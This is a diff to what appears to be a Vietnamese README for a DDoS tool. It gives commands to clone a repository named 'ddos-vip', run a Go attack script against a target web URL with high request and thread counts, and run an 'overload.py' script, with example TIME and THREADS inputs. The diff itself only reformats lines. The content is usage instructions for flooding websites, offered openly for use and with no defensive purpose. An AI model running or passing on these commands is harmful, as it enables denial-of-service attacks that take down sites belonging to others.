@@ -6,6 +6,7 @@ pkg install openjdk-17
 sudo apt install golang
 # Lệnh Vào Tool
 git clone https://github.com/User-xquyen/ddos-vip
+
 cd toolddos-vippro
 # Chế độ Get sài cho web https://
 go run ddosbyXQ.go https://linkweb.com 2000 get 5000 nil
@@ -31,4 +32,10 @@ pip3 install -r requirements.txt
 
 python3 overload.py
 
-├───Cách Nhập │ ├───TIME:1000 │ └───THREADS:20000 │ └───URL:link web
+├───Cách Nhập
+│
+├───TIME:1000
+│
+└───THREADS:20000
+│
+└───URL:link web
